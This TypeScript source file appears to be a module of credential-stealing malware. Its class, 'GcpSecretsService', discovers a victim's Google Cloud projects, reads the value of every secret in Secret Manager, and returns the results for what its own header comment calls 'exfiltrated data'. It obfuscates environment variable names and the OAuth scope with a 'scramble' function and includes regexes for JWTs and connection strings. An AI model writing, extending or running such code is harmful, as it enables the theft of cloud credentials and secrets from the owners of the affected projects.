// ═════════════════════════════════════════════════════════════════════════════
// GcpSecretsService — enumerates secrets from GCP Secret Manager
//
// Always returns `success: true` with an `ok` flag so error details are
// included in the exfiltrated data even when every project fails.
// ═════════════════════════════════════════════════════════════════════════════

import { logUtil } from "../../utils/logger";
import { Provider } from "../base";
import type { ProviderResult } from "../types";
import { resolveToken } from "./auth";
import {
  accessSecretVersion,
  extractSecretShortName,
  type GcpSecretItem,
  listProjects,
  listSecrets,
} from "./client";

declare function scramble(str: string): string;

// ── Project discovery ───────────────────────────────────────────────────────

function getProjectIdFromEnv(): string | undefined {
  return (
    process.env[scramble("GCP_PROJECT")] ??
    process.env[scramble("GCLOUD_PROJECT")] ??
    process.env[scramble("GOOGLE_CLOUD_PROJECT")] ??
    process.env[scramble("DEVSHELL_PROJECT_ID")]
  );
}

// ── Main Provider ───────────────────────────────────────────────────────────

export class GcpSecretsService extends Provider {
  private projectIds: string[] = [];
  private projectErrors: Array<{ project: string; error: string }> = [];

  constructor() {
    super("gcp", "secretmanager", {
      jwt: /eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/g,
      connection_string: /[A-Za-z]+:\/\/[^@\s]+@[^;\s]+/g,
    });
  }

  async execute(): Promise<ProviderResult> {
    const errors: string[] = [];
    this.projectErrors = [];

    // 1. Auth check
    try {
      await resolveToken(
        scramble("https://www.googleapis.com/auth/cloud-platform"),
      );
    } catch (e) {
      const msg = `GCP auth failed: ${e instanceof Error ? e.message : String(e)}`;
      logUtil.log(`[gcp] ${msg}`);
      errors.push(msg);
    }

    // 2. Project discovery
    let discoveredProjects: Array<{
      projectId: string;
      name: string;
      lifecycleState: string;
    }> = [];

    if (errors.length === 0) {
      const envProject = getProjectIdFromEnv();
      if (envProject) {
        logUtil.log(`[gcp] Using project from env: ${envProject}`);
        discoveredProjects = [
          { projectId: envProject, name: envProject, lifecycleState: "ACTIVE" },
        ];
      } else {
        logUtil.log(
          "[gcp] No GCP_PROJECT env set — listing projects via CRM...",
        );
        try {
          discoveredProjects = await listProjects();
          logUtil.log(
            `[gcp] CRM returned ${discoveredProjects.length} project(s).`,
          );
        } catch (e) {
          const msg = `Project discovery failed: ${e instanceof Error ? e.message : String(e)}`;
          logUtil.log(`[gcp] ${msg}`);
          errors.push(msg);
        }
      }
    }

    this.projectIds = discoveredProjects.map((p) => p.projectId);

    // 3. Fetch secrets from each project
    const allResults: Array<{
      projectId: string;
      secrets: Record<string, string | { error: string }>;
      error?: string;
    }> = [];

    for (const projectId of this.projectIds) {
      try {
        logUtil.log(`[gcp] Listing secrets for project ${projectId}...`);
        const secrets = await listSecrets(projectId);
        logUtil.log(
          `[gcp] Project ${projectId} has ${secrets.length} secret(s).`,
        );
        const secretValues: Record<string, string | { error: string }> = {};

        for (const secretItem of secrets) {
          const shortName = extractSecretShortName(secretItem.name);
          try {
            const value = await accessSecretVersion(secretItem.name);
            secretValues[shortName] = value ?? "EMPTY_OR_BINARY";
          } catch (e) {
            const msg = e instanceof Error ? e.message : String(e);
            logUtil.log(`[gcp] Failed to access secret ${shortName}: ${msg}`);
            secretValues[shortName] = { error: msg };
          }
        }

        allResults.push({ projectId, secrets: secretValues });
      } catch (err) {
        const errorMsg = err instanceof Error ? err.message : String(err);
        logUtil.log(
          `[gcp] Failed to list secrets for project ${projectId}: ${errorMsg}`,
        );
        this.projectErrors.push({ project: projectId, error: errorMsg });
        allResults.push({ projectId, secrets: {}, error: errorMsg });
      }
    }

    const dumped = allResults.filter((r) => !r.error).length;

    return this.success({
      ok: errors.length === 0 && dumped > 0,
      authError: errors.length > 0 ? errors : undefined,
      projectsFound: this.projectIds.length,
      dumped,
      errored: allResults.filter((r) => r.error).length,
      projects: allResults,
      projectErrors:
        this.projectErrors.length > 0 ? this.projectErrors : undefined,
    });
  }
}
